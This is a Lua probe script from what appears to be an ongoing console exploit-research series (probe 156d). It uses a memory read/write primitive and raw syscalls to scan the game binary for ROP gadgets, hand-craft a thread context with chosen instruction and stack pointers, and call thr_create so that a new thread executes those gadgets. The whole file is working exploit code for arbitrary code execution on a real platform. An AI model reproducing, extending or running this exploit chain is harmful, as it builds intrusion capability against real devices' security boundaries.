-- CRASH_CLASS: HIGH (creates a thread that executes a gadget)
-- PROBE 156d: does the new thread EXECUTE, or just exist?
--
-- 156c proved thr_create(430) accepts a context with magic +0x108=0x480,
-- flags +0x0d0=0, type +0x110=0x10000, CS +0x0C0=0x43, RIP +0x0E0, RSP
-- +0x0F8, SS +0x100=0x3B: it returned rv=0, wrote TID 0x18EE3 and
-- thr_kill(433, sig=0) answered 0 for it (results/phase17_new_vectors/156c_
-- thr_create_correct_offsets_20261020_164129.txt). A live TID is not yet
-- proof of execution.
--
-- This probe makes the child write memory instead of spinning:
--   RIP = a `mov [rdx], rax; ret` gadget in eboot's RX .text
--   RAX = 0xDEADBEEFCAFE, RDX = a zeroed mmap page, RSP = a stack whose
--   first qword is `jmp $`, so after the store the child spins instead of
--   returning into nothing.
-- If the marker appears in the page, the child executed two real
-- instructions in ring 3.
--
-- Layout reference: docs/THR_CREATE_PANIC_PATH_13.60.md §3 gives
-- ctx+0x48..0xB8 = rdi,rsi,rdx,rcx,r8,r9,rax,rbx,rbp,r10,r11,r12,r13,r14,r15.

print("=== PROBE 156d: CHILD EXECUTION VIA MARKER WRITE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_self = make_syscall(432)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RSI, C_RDX, C_RCX = 0x048, 0x050, 0x058, 0x060
local C_R8, C_R9, C_RAX, C_RBX = 0x068, 0x070, 0x078, 0x080

local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main TID=" .. q(main_tid))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

-- Byte-pair scan with 4-byte verification
local function find_bytes(base, limit, p0, p1, p2, p3)
    local off = 0
    while off < limit do
        if off % 0x40000 == 0 and off > 0 then
            print("      ... scanned " .. string.format("0x%X", off) .. " bytes")
        end
        local v = rd(base + off)
        if not v then return nil end
        local b0 = v % 0x100
        local b1 = math.floor(v / 0x100) % 0x100
        local b2 = math.floor(v / 0x10000) % 0x100
        local b3 = math.floor(v / 0x1000000) % 0x100
        local cand = nil
        if b0 == p0 and b1 == p1 then cand = base + off
        elseif b1 == p0 and b2 == p1 then cand = base + off + 1
        elseif b2 == p0 and b3 == p1 then cand = base + off + 2
        else
            local v2 = rd(base + off + 4)
            if not v2 then return nil end
            local c0 = v2 % 0x100
            if b3 == p0 and c0 == p1 then cand = base + off + 3 end
        end
        if cand then
            if rb(cand + 2) == p2 and rb(cand + 3) == p3 then return cand end
        end
        off = off + 4
    end
    return nil
end

-- mov [rdx], rax; ret   = 48 89 02 C3
-- mov [rsi], rax; ret   = 48 89 06 C3
-- mov [rdi], rax; ret   = 48 89 07 C3
local gadget, gname, greg = find_bytes(eboot_base, 0x100000, 0x48, 0x89, 0x02, 0xC3), "mov [rdx],rax;ret", C_RDX
if not gadget then
    gadget, gname, greg = find_bytes(eboot_base, 0x100000, 0x48, 0x89, 0x06, 0xC3), "mov [rsi],rax;ret", C_RSI
end
if not gadget then
    gadget, gname, greg = find_bytes(eboot_base, 0x100000, 0x48, 0x89, 0x07, 0xC3), "mov [rdi],rax;ret", C_RDI
end
if not gadget then
    print("[0] no store gadget found in the first 1 MB of eboot; aborting")
    return
end
print("[0] gadget=" .. q(gadget) .. " (" .. gname .. ") bytes " ..
    string.format("%02X %02X %02X %02X", to_num(rb(gadget)), to_num(rb(gadget + 1)),
        to_num(rb(gadget + 2)), to_num(rb(gadget + 3))))

-- jmp $ for the return target (2-byte scan)
local function find_pair(base, limit, p0, p1)
    local off = 0
    while off < limit do
        local v = rd(base + off)
        if not v then return nil end
        local b0 = v % 0x100
        local b1 = math.floor(v / 0x100) % 0x100
        local b2 = math.floor(v / 0x10000) % 0x100
        local b3 = math.floor(v / 0x1000000) % 0x100
        if b0 == p0 and b1 == p1 then return base + off end
        if b1 == p0 and b2 == p1 then return base + off + 1 end
        if b2 == p0 and b3 == p1 then return base + off + 2 end
        local v2 = rd(base + off + 4)
        if v2 and b3 == p0 and (v2 % 0x100) == p1 then return base + off + 3 end
        off = off + 4
    end
    return nil
end

local jmp_self = find_pair(eboot_base, 0x100000, 0xEB, 0xFE)
if not jmp_self then
    print("[0] no EB FE found; aborting")
    return
end
print("[0] jmp $=" .. q(jmp_self))

-- Marker page + stack
local page_size = 0x4000
local ok_m1, marker = pcall(function()
    return sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local ok_m2, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(page_size * 4), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local mh, ml = get_hi_lo(marker)
local sh, sl = get_hi_lo(stack_base)
if not ok_m1 or not ok_m2 or (mh == 0 and ml == 0) or (sh == 0 and sl == 0) then
    print("[0] mmap failed; aborting")
    return
end
zero(marker, page_size)
print("[0] marker page=" .. q(marker) .. " stack=" .. q(stack_base))
local stack_top = stack_base + page_size * 4 - 0x100
wq(stack_top, jmp_self)

local MARKER = 0xDEADBEEFCAFE
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + C_MAGIC, uint64(0x480))
wd(ctx + C_FLAGS, 0)
wq(ctx + C_TYPE, uint64(0x10000))
wq(ctx + C_CS, uint64(0x43))
wq(ctx + C_SS, uint64(0x3B))
wq(ctx + C_RIP, gadget)
wq(ctx + C_RSP, stack_top)
wq(ctx + C_RAX, uint64(MARKER))
wq(ctx + greg, marker)

print("[1] RSP target [rsp]=" .. q(rq(stack_top)) .. "  RAX=" .. q(rq(ctx + C_RAX)) ..
    "  target reg(" .. string.format("+0x%03X", greg) .. ")=" .. q(rq(ctx + greg)))

zero(tid_buf, 8)
wq(tid_buf, uint64(0xDEADDEAD))
print("[1] calling thr_create ...")
local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local child_tid = rq(tid_buf)
print("[1] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(to_num(rv_tc)) ..
    " tid=" .. q(child_tid))

local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 300000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local got = rq(marker)
print("[2] marker[0]=" .. q(got) .. " (want 0x" .. string.format("%X", MARKER) .. ")")
local ok_k, rv_k = pcall(function() return sc_thr_kill(child_tid, uint64(0)) end)
print("[2] thr_kill(child_tid, 0): rv=" .. tostring(to_num(rv_k)))

if got and get_hi_lo(got) then
    local gh, gl = get_hi_lo(got)
    if gh == math.floor(MARKER / 4294967296) and gl == (MARKER % 4294967296) then
        print("[2] *** CHILD EXECUTED: the gadget stored the marker in ring-3 memory ***")
    else
        print("[2] *** marker unchanged: the child did not reach the gadget ***")
    end
end

local ok_c2, pid_c2 = pcall(function() return sc_getpid():tonumber() end)
print("[3] final canary: ok=" .. tostring(ok_c2) .. " pid=" .. tostring(pid_c2))
print("")
print("=== PROBE 156d COMPLETE ===")
print("=== PROBE 156d COMPLETE ===")
